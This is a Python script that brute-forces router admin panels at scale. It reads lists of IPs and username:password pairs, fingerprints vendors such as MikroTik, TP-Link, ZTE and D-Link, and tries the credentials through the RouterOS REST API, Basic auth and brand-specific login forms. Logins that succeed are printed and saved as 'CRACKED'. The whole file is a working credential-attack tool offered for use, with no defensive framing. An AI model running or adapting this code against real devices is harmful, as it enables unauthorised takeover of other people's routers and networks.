#!/usr/bin/env python3
"""Type-aware router credential tester v2.

Priority: RouterOS REST (clean 401->200 oracle) > Basic auth > brand form shapes.
Reads a JSON list of panels [{ip,port,fp,...}] and a creds file (user:pass per line).
"""
import argparse, asyncio, json, os, re, ssl, base64, sys
from collections import Counter

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"
PW_INPUT = re.compile(r'type\s*=\s*["\']?password', re.I)
LOGINISH = re.compile(r"(login|signin|sign-in|auth|dologin)", re.I)

async def req(host, port, method="GET", path="/", scheme="http", body=None,
              headers=None, timeout=6, read=20000, follow=False):
    try:
        if scheme == "https":
            ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=timeout)
        else:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
    except Exception:
        return None
    try:
        hdrs = [f"{method} {path} HTTP/1.1", f"Host: {host}:{port}", f"User-Agent: {UA}",
                "Accept: text/html,application/xhtml+xml,*/*;q=0.8", "Connection: close"]
        for k, v in (headers or {}).items(): hdrs.append(f"{k}: {v}")
        data = b""
        if body is not None:
            data = body.encode()
            hdrs += ["Content-Type: application/x-www-form-urlencoded", f"Content-Length: {len(data)}"]
        w.write(("\r\n".join(hdrs) + "\r\n\r\n").encode() + data)
        await asyncio.wait_for(w.drain(), timeout=timeout)
        buf = b""
        while len(buf) < read:
            try:
                chunk = await asyncio.wait_for(r.read(8192), timeout=timeout)
            except Exception:
                break
            if not chunk: break
            buf += chunk
    except Exception:
        buf = b""
    finally:
        try: w.close()
        except Exception: pass
    if not buf: return None
    txt = buf.decode("utf-8", "ignore")
    head, _, b = txt.partition("\r\n\r\n")
    m = re.match(r"HTTP/\d\.\d\s+(\d+)", head)
    return {"status": int(m.group(1)) if m else 0, "head": head, "body": b,
            "loc": (re.search(r"[Ll]ocation:\s*(\S+)", head).group(1) if re.search(r"[Ll]ocation:\s*(\S+)", head) else "")}

def has_pw(b): return bool(PW_INPUT.search(b or ""))

async def crack(ip, port, creds, sem):
    async with sem:
        out = {"ip": ip, "port": port}
        scheme = "http"
        base = await req(ip, port, path="/", scheme=scheme)
        if not base or not base["status"]:
            scheme = "https"
            base = await req(ip, port, path="/", scheme=scheme)
            if not base or not base["status"]: return None
        out["scheme"] = scheme
        base_pw = has_pw(base["body"])
        out["base_pw"] = base_pw
        tm = re.search(r"<title[^>]*>(.*?)</title>", base["body"], re.I | re.S)
        out["title"] = re.sub(r"\s+", " ", tm.group(1))[:60] if tm else ""
        blob = base["body"][:6000].lower()
        title = out["title"].lower()

        # ---- type detection ----
        if "routeros" in title or "routeros" in blob or "webfig" in blob: out["fp"]="MikroTik"
        elif "tp-link" in blob or "tp-link" in title: out["fp"]="TP-Link"
        elif "d-link" in blob or "d-link" in title: out["fp"]="D-Link"
        elif "zxhn" in blob or "zte" in blob: out["fp"]="ZTE"
        elif "netgear" in blob: out["fp"]="Netgear"
        elif "luci" in blob or "openwrt" in blob: out["fp"]="OpenWrt"
        elif "zyxel" in blob: out["fp"]="Zyxel"
        elif "tenda" in blob: out["fp"]="Tenda"
        elif "huawei" in blob or "hilink" in blob: out["fp"]="Huawei"
        else: out["fp"]="Unknown"

        # REST oracle
        r0 = await req(ip, port, path="/rest/system/resource", scheme=scheme)
        rest = bool(r0 and r0["status"] == 401)
        out["rest"] = rest
        # also probe /rest/ip/proxy availability later

        for user, pw in creds:
            tok = base64.b64encode(f"{user}:{pw}".encode()).decode()
            if rest:
                r = await req(ip, port, path="/rest/system/resource", scheme=scheme,
                              headers={"Authorization": f"Basic {tok}"})
                if r and r["status"] == 200:
                    out.update({"login":"OK","method":"routeros-rest","user":user,"pw":pw,
                                "evidence": r["body"][:180]}); return out
            # basic on /
            r = await req(ip, port, path="/", scheme=scheme, headers={"Authorization": f"Basic {tok}"})
            if r and r["status"] in (200,302,301) and "www-authenticate" not in r["head"].lower() and not has_pw(r["body"]):
                if r["body"][:300] != base["body"][:300]:
                    out.update({"login":"OK","method":"basic","user":user,"pw":pw,
                                "evidence": r["body"][:150]}); return out
            # brand-specific form shapes
            shapes = [("/", {"username":user,"password":pw}), ("/", {"user":user,"pass":pw})]
            if out["fp"] == "ZTE":
                shapes = [("/", {"Frm_Username":user,"Frm_Password":pw}),
                          ("/", {"Username":user,"Password":pw}),
                          ("/login.cgi", {"Username":user,"Password":pw})] + shapes
            elif out["fp"] == "D-Link":
                shapes = [("/login.cgi", {"admin_Password":pw}),
                          ("/cgi-bin/login.cgi", {"admin_Password":pw})] + shapes
            elif out["fp"] == "TP-Link":
                shapes = [("/", {"userName":user,"pcPassword":pw}),
                          ("/cgi-bin/luci", {"username":user,"password":pw})] + shapes
            elif out["fp"] == "OpenWrt":
                shapes = [("/cgi-bin/luci", {"username":user,"password":pw})] + shapes
            for path, fields in shapes[:4]:
                body = "&".join(f"{k}={v}" for k,v in fields.items())
                r = await req(ip, port, method="POST", path=path, scheme=scheme, body=body)
                if not r or not r["status"]: continue
                if r["status"] in (302,303) and r["loc"] and not LOGINISH.search(r["loc"]):
                    out.update({"login":"OK","method":f"form{path}","user":user,"pw":pw,
                                "evidence":f"302->{r['loc'][:80]}"}); return out
                if r["status"] == 200 and base_pw and not has_pw(r["body"]) and len(r["body"])>400:
                    if re.search(r"stok=|sid=|session|token=", r["head"]+r["body"][:2000], re.I):
                        out.update({"login":"OK","method":f"form{path}","user":user,"pw":pw,
                                    "evidence":"session"}); return out
        out["login"]="FAIL"
        return out

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--in", dest="inp", required=True)
    ap.add_argument("--creds", required=True)
    ap.add_argument("--shard", default="0/1")
    ap.add_argument("--out", default="out")
    ap.add_argument("--conc", type=int, default=80)
    ap.add_argument("--maxtries", type=int, default=40)
    ap.add_argument("--limit", type=int, default=0)
    a = ap.parse_args()
    i, n = (int(x) for x in a.shard.split("/"))
    os.makedirs(a.out, exist_ok=True)
    creds = []
    for line in open(a.creds):
        line = line.rstrip("\n")
        if not line or ":" not in line: continue
        u, _, p = line.partition(":")
        creds.append((u, p))
    creds = creds[:a.maxtries]
    rows = json.load(open(a.inp))
    seen, panels = set(), []
    for r in rows:
        k = (r["ip"], str(r["port"]))
        if k in seen: continue
        seen.add(k); panels.append(k)
    panels = [p for j, p in enumerate(panels) if j % n == i]
    if a.limit: panels = panels[:a.limit]
    print(f"[*] shard {i}/{n}: {len(panels)} panels x {len(creds)} creds", flush=True)
    sem = asyncio.Semaphore(a.conc)
    res, wins = [], []
    for k, t in enumerate(asyncio.as_completed([asyncio.create_task(crack(ip, p, creds, sem)) for ip, p in panels]), 1):
        try: r = await t
        except Exception: r = None
        if r:
            res.append(r)
            if r.get("login") == "OK":
                wins.append(r)
                print(f"  *** {r['user']}:{r['pw']} @ {r['ip']}:{r['port']} [{r.get('fp')}] via {r['method']} | {r.get('title','')[:30]}", flush=True)
        if k % 50 == 0: print(f"  {k}/{len(panels)} tested, {len(wins)} cracked", flush=True)
    json.dump(res, open(f"{a.out}/crack2-{i}.json","w"), indent=1)
    print(f"\n=== shard {i}: {len(res)} tested, {len(wins)} CRACKED ===", flush=True)
    print("  fp mix:", dict(Counter(x.get('fp') for x in res).most_common()), flush=True)
    print("  rest panels:", sum(1 for x in res if x.get("rest")), flush=True)

if __name__ == "__main__":
    asyncio.run(main())